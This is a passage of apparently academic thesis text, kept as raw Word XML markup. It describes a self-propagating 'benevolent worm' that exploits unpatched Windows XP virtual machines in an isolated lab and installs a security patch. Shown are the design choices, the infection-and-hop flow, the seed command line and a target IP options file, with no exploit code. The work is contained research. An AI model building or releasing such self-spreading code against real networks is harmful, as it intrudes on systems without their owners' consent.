        <w:t xml:space="preserve">C++ </w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">language </w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>with all libraries statically compiled using g++  (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MinGW</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 4.</w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.2.  C++ has the advantage of object-oriented programming as well as easier to use string </w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">manipulation libraries which help to avoid accidentally creating buffer overflow vulnerabilities in the worm itself.  Buffer overflows must be avoided in the worm itself to prevent counter-attacks from using the worm as a vulnerability exploit or access to the system.  The use of the Java programming language was considered, but it would require the target to have a supporting Java JVM installed which isn’t universal or consistent.  Although C++ compiled code is slightly larger than C code it isn’t significant enough for this project or distribution of the worm.  The primary consideration in complied executable size is whether the code can fit into memory for a various exploit as well as minimizing network traffic congestion.  Since many various machines are accessed with various versions of installed common libraries it is necessary to statically compile and link all the necessary code which does increase the size to a degree but does avoid the trouble of machines with missing dynamic libraries.  This does </w:t>
      </w:r>
      <w:r w:rsidR="0089241F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">possibly </w:t>
      </w:r>
      <w:r w:rsidR="0089241F" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>exclude some third party libraries from being used if they add too much to the size of the compiled executable.  Code was compiled on a Linux system with a cross compiler and seeded on an initial Windows OS virtual machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0089241F" w:rsidRPr="00861880" w:rsidRDefault="0089241F" w:rsidP="0089241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The Windows operating system was chosen because of its popularity and many known exploits.  Multiple editions are used in a test environment setup in a research lab:</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26 instances of XP Professional with no SP, 32-bit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2 instances of XP Professional with SP1, 64-bit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1 instance of Vista Business with SP1, 32-bit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1 instance of Vista Business with SP1, 64-bit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1 instance of Windows 7 Professional with no SP, 32-bit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1 instance of Windows 7 Professional with no SP, 64-bit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t>1 instance of Windows Server 2003 Standard with no SP, 32-bit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0089241F" w:rsidRPr="00D232AC"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D232AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1 instance of Windows Server 2003 Standard with no SP, 64-bit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0089241F" w:rsidRDefault="0089241F" w:rsidP="0089241F">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Various levels of service packs and patches are applied already</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the default installation</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with instances left unpatched on purpose to test the spread of the worm against a known exploit.  The virtual machines are all isolated into their own pri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">vate network with only a single </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VPN providing access.  In addition the Windows virtual machine guests are isolated onto their own VLAN along with firewall rules to prevent accidental release of the worm onto other networks.  See Appendix A for a diagram of the network configuration.</w:t>
      </w:r>
      <w:r w:rsidR="00CC3A3D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00BC2729"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C3A3D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he Windows XP Professional 32-bit VMs were vulnerable and expected to be exploited by the benevolent worm.  In addition the Windows Server 2003 Standard 32-bit</w:t>
      </w:r>
      <w:r w:rsidR="00CC3A3D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CC3A3D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerable, but the benevolent worm does not carry an OS patch that can repair it.  Thus the worm is expected to run on that system but not be able to patch it.  The other VMs have versions of Windows that are not exploitable by the worm and are expected to therefore either have no effect or </w:t>
      </w:r>
      <w:r w:rsidR="00CC3A3D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>encounter</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a service or OS crash.  Evaluations of these systems will help to represent possible undetermined behavior of a worm spreading in a network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="006F225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 range of IPs was defined with </w:t>
      </w:r>
      <w:r w:rsidR="00E02DEF" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>contiguous</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> IPs for the same OS edition and version</w:t>
      </w:r>
      <w:r w:rsidR="008E45CF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (see Appendix B)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  Breaks between OS edition groups was provided to simulate IPs that won’t respond.  The worm was configured to simply go through the range of IPs</w:t>
      </w:r>
      <w:r w:rsidR="00AA6D8D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in sequential order</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> including the IPs that are </w:t>
      </w:r>
      <w:r w:rsidR="00841D64">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>non-existent</w:t>
      </w:r>
      <w:r w:rsidR="00FD653D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> virtual machines.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="007969E5"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worm was run from a seed host not in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM range.  It ran the worm without attempting an OS patch on the seed system.  Once the worm successfully exploits a system it copies itself and starts </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>execution</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the other system.  The flow is as follows:</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Seed VM runs worm code</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lastRenderedPageBreak/>
        <w:t>Worm logs configuration and options</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Worm attempts to exploit the first target IP in the provided list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A9337D" w:rsidRDefault="00A9337D" w:rsidP="00A9337D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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successful</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D" w:rsidRDefault="00CB26A3" w:rsidP="00A9337D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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worm copies itself and runs on exploited target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A9337D" w:rsidRDefault="00A9337D" w:rsidP="00A9337D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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not successful</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D" w:rsidRDefault="00CB26A3" w:rsidP="00A9337D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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worm tries next target IP in the provided list</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Once worm has successful exploit it ends execution on the current host</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 xml:space="preserve">Worm runs on new </w:t>
      </w:r>
      <w:r w:rsidR="002F6A6D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00731719">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">successfully </w:t>
      </w:r>
      <w:r w:rsidR="002F6A6D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">exploited) </w:t>
      </w:r>
      <w:r w:rsidRPr="00A9337D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target host</w:t>
      </w:r>
      <w:r w:rsidR="002B76E4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no longer the seed)</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Worm logs configuration and options</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D" w:rsidRDefault="002C6789" w:rsidP="002C6789">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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B26A3" w:rsidRPr="00A9337D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>arget list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is now shorter since previous targets have been removed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D"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Worm runs OS update patch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="009C76F1" w:rsidRDefault="009C76F1" w:rsidP="00A9337D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C76F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>While target list isn't empty</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the w</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="009C76F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>orm attempts to exploit the next target IP in the list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D" w:rsidRDefault="00CB26A3" w:rsidP="009C76F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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If successful worm hops to next machine and ends</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A9337D" w:rsidRDefault="00CB26A3" w:rsidP="009C76F1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A9337D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If unsuccessful worm tries the next target IP in the list</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This process continues in a hop-by-hop fashion until the target IP list is exhausted by the last successful hop of the worm</w:t>
      </w:r>
      <w:r w:rsidR="00951C11">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00C6077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Target machines successfully exploited by the worm are patched but not rebooted.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  The particular patch for this vulnerability </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>doesn’t take effect until after a manual reboot.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  This is to prevent interruption of loss of data to a user.  An alternative could have been to give a warning with a countdown of when the </w:t>
      </w:r>
      <w:r w:rsidR="006C3DE7">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would be rebooted.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="008C19E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B26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">I used a Windows Server 2008 R2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Enterprise Edition </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>64-bit fully patche</w:t>
      </w:r>
      <w:r w:rsidR="00356C91">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> server as the seed host.  I copied the compiled worm executable (thesisworm.exe) and ran it with the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="006F27C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thesisworm.exe thesisworm.exe Research_Options_File.txt WindowsXP-KB823980-x86-ENU.exe ISSEED</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="007A6425"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7A6425">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thesisworm.exe points to the binary to be copied to each machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="007A6425"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7A6425">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Research_Options_File.txt is the worm options and list of target IPs (example given below)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="007A6425"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7A6425">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WindowsXP-KB823980-x86-ENU.exe is the OS patch to copy and run on target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="007A6425"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7A6425">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ISSEED is flag to indicate to worm instance to not run OS patch on the current system</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Example of Research_Options_File.txt</w:t>
      </w:r>
      <w:r w:rsidR="006A25A3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00E65C50" w:rsidP="00E65C50">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>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192.168.0.2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previous parent (aka worm source or hop)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>2012-03-23T14:50:37,537Z</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The previous source timestamp</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>192.168.0.2</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The seed IP or ID</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>192.168.0.150</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First target IP</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>192.168.0.151</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Second target IP</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>192.168.0.152</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etc.</w:t>
